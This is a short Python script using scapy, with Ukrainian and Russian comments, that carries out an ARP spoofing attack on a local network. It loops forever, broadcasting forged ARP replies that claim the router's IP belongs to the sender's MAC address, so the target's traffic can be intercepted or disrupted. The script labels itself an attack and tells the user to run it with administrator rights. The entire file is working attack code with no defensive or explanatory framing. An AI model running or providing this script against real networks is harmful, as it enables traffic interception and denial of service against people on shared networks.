from scapy.all import ARP, Ether, sendp, get_if_hwaddr, conf
import time

# --- НАЛАШТУВАННЯ ---
# 1. Ваш реальный IP (из ipconfig)
target_ip = "192.168.1.115" 
# 2. IP роутера, який ми "підроблюємо"
fake_ip = "192.168.1.1"
# -----------------

try:
    # Беремо MAC вашого Wi-Fi адаптера
    my_mac = get_if_hwaddr(conf.iface)
    print(f"Запуск атаки! Мій MAC: {my_mac}")
    print(f"Ціль: {target_ip} вірить, що {fake_ip} — це я.")

    # Створюємо пакет: Ethernet заголовок + ARP відповідь
    # dst="ff:ff:ff:ff:ff:ff" надсилає пакет усім в мережі (Broadcast)
    packet = Ether(src=my_mac, dst="ff:ff:ff:ff:ff:ff") / \
             ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=fake_ip)

    while True:
        sendp(packet, verbose=False)
        time.sleep(0.1) # Надсилаємо 10 пакетів у секунду
except Exception as e:
    print(f"ПОМИЛКА: {e}")
    print("ПІДКАЗКА: Запустіть терминал від імені АДМІНІСТРАТОРА!")
except KeyboardInterrupt:
    print("\nАтака призупинена.")